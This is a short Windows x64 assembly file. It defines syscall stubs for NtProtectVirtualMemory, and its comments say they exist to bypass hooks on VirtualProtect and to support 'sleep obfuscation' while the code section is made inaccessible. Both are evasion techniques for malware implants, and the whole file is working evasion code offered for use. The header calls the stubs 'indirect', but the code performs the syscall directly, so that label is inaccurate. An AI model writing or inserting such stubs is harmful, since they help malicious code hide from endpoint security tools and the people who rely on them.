# indirect syscall stubs - windows x64
# nt_protect = NtProtectVirtualMemory via syscall, bypasses any hook on VirtualProtect
# args: rcx=proc rdx=base r8=size r9=new_prot [rsp+0x28]=old_prot (same as what kernel expects)

.extern _nt_protect_id

.text

.global nt_protect
nt_protect:
    movq %rcx, %r10
    movl _nt_protect_id(%rip), %eax
    syscall
    ret

# nt_protect_crypt lives in .crypt so sleep obfuscation can call it while .text is NOACCESS
.section .crypt, "ax"

.global nt_protect_crypt
nt_protect_crypt:
    movq %rcx, %r10
    movl _nt_protect_id(%rip), %eax
    syscall
    ret
